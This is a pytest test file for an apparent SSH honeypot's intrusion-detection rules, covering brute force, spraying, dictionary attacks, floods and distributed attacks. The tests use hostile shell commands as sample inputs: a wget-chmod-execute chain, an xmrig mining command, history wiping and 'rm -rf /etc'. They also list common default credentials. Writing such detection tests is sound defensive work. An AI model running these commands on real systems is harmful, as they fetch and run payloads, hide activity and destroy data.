import itertools
from datetime import datetime, timedelta, timezone

from database.db import init_db, insert_events
from collector.log_collector import hash_password
from detection.detection_rules import run_global_rules, run_rules
from detection.detector import run_detection

BASE = datetime(2026, 11, 5, tzinfo=timezone.utc)
_ids = itertools.count()


def ts(sec):
    return (BASE + timedelta(seconds=sec)).strftime("%Y-%m-%dT%H:%M:%SZ")


def ev(sec, etype="login_failed", user="root", pw="pw1", session="s1", cmd=None):
    return {
        "event_id": f"e{next(_ids)}", "event_type": etype, "timestamp": ts(sec),
        "source_ip": "10.0.0.9", "session_id": session, "username": user,
        "password_masked": "p***", "password_hash": pw, "command": cmd, "duration_s": None,
    }


def types(events):
    return {a["alert_type"] for a in run_rules("10.0.0.9", events)}


def test_brute_force_triggers_at_threshold():
    assert "brute_force" in types([ev(i) for i in range(5)])
    assert "brute_force" not in types([ev(i) for i in range(4)])


def test_slow_attempts_do_not_trigger():
    assert "brute_force" not in types([ev(i * 20) for i in range(5)])   


def test_rapid_attack():
    t = types([ev(i * 2) for i in range(10)])                           
    assert {"rapid_attack", "brute_force"} <= t


def test_username_enumeration():
    events = [ev(i, user=f"user{i}", pw=f"h{i}") for i in range(5)]
    assert "username_enumeration" in types(events)


def test_password_spraying():
    events = [ev(i, user=u) for i, u in enumerate(["a", "b", "c"])]
    assert "password_spraying" in types(events)


def test_repeated_attacks():
    events = [ev(h * 3600 + i) for h in range(3) for i in range(3)]    # 3 failures x 3 hours
    t = types(events)
    assert "repeated_attacks" in t and "brute_force" not in t


def test_success_after_failures_is_critical():
    events = [ev(i) for i in range(5)] + [ev(10, "login_success")]
    alerts = run_rules("10.0.0.9", events)
    crit = [a for a in alerts if a["alert_type"] == "success_after_failures"]
    assert crit and crit[0]["severity"] == "critical"


def test_suspicious_command():
    alerts = run_rules("10.0.0.9", [ev(1, "command", cmd="wget http://x/y.sh; chmod +x y.sh")])
    assert alerts[0]["alert_type"] == "suspicious_commands"
    assert alerts[0]["severity"] == "high"


def test_detector_is_idempotent(tmp_path):
    db = tmp_path / "t.db"
    init_db(db)
    insert_events([ev(i) for i in range(6)], db)
    first, second = run_detection(db), run_detection(db)
    assert first["new_alerts"] >= 1
    assert second["new_alerts"] == 0


# ---------------------------------------------------------------- new rules
def pw_ev(sec, password, user="root", ip="10.0.0.9", **kw):
    e = ev(sec, user=user, pw=hash_password(password), **kw)
    e["source_ip"] = ip
    return e


def test_dictionary_attack_uses_common_password_list():
    common = ["123456", "password", "admin", "qwerty", "letmein"]
    assert "dictionary_attack" in types([pw_ev(i, p) for i, p in enumerate(common)])
    # random-looking passwords are not in the list
    rare = [f"x{i}Zq!{i * 7}" for i in range(5)]
    assert "dictionary_attack" not in types([pw_ev(i, p) for i, p in enumerate(rare)])
    # the same common password five times is not a *dictionary* (one distinct value)
    assert "dictionary_attack" not in types([pw_ev(i, "123456") for i in range(5)])


def test_connection_flood():
    flood = [ev(i, "connect", user=None, pw=None, session=f"s{i}") for i in range(20)]
    assert "connection_flood" in types(flood)
    assert "connection_flood" not in types(flood[:10])


def test_download_and_execute_chain():
    chain = [ev(1, "command", cmd="wget http://x/y.sh"), ev(2, "command", cmd="chmod +x y.sh"),
             ev(3, "command", cmd="./y.sh")]
    alerts = [a for a in run_rules("10.0.0.9", chain) if a["alert_type"] == "download_and_execute"]
    assert len(alerts) == 1 and alerts[0]["severity"] == "critical"   # one alert per session


def test_download_without_execute_is_not_flagged():
    assert "download_and_execute" not in types([ev(1, "command", cmd="wget http://x/y.sh")])
    assert "download_and_execute" not in types([ev(1, "command", cmd="chmod +x tool")])


def test_download_and_execute_must_be_same_session():
    events = [ev(1, "command", cmd="wget http://x/y.sh", session="a"),
              ev(2, "command", cmd="./y.sh", session="b")]
    assert "download_and_execute" not in types(events)


def test_new_command_categories():
    def cats(cmd):
        a = run_rules("10.0.0.9", [ev(1, "command", cmd=cmd)])
        return a[0]["description"] if a else ""
    assert "cryptomining" in cats("./xmrig -o stratum+tcp://pool:3333")
    assert "defense_evasion" in cats("history -c && unset HISTFILE")
    assert "destruction" in cats("rm -rf /etc")
    assert cats("ls -la") == ""                      # harmless command: no alert


def test_distributed_attack_across_ips():
    events = {}
    for n, ip in enumerate(["1.1.1.1", "2.2.2.2", "3.3.3.3"]):
        events[ip] = []
        for i, (user, pw) in enumerate([("root", "123456"), ("admin", "admin"), ("pi", "raspberry")]):
            e = pw_ev(n + i * 5, pw, user=user, ip=ip)
            events[ip].append(e)
    alerts = run_global_rules(events)
    assert [a["alert_type"] for a in alerts] == ["distributed_attack"]
    assert "3 different IPs" in alerts[0]["description"]


def test_distributed_attack_needs_enough_ips_and_shared_credentials():
    two_ips = {ip: [pw_ev(i, "123456", ip=ip) for i in range(3)] for ip in ("1.1.1.1", "2.2.2.2")}
    assert run_global_rules(two_ips) == []
    one_cred = {ip: [pw_ev(0, "123456", ip=ip)] for ip in ("1.1.1.1", "2.2.2.2", "3.3.3.3")}
    assert run_global_rules(one_cred) == []          # shared credentials below threshold


def test_distributed_attack_stored_by_detector(tmp_path):
    db = tmp_path / "t.db"
    init_db(db)
    batch = []
    for n, ip in enumerate(["1.1.1.1", "2.2.2.2", "3.3.3.3"]):
        for i, (user, pw) in enumerate([("root", "123456"), ("admin", "admin"), ("pi", "raspberry")]):
            batch.append(pw_ev(n + i * 5, pw, user=user, ip=ip, session=f"s-{ip}"))
    insert_events(batch, db)
    assert run_detection(db)["new_alerts"] >= 1
    assert run_detection(db)["new_alerts"] == 0      # idempotent for global rules too

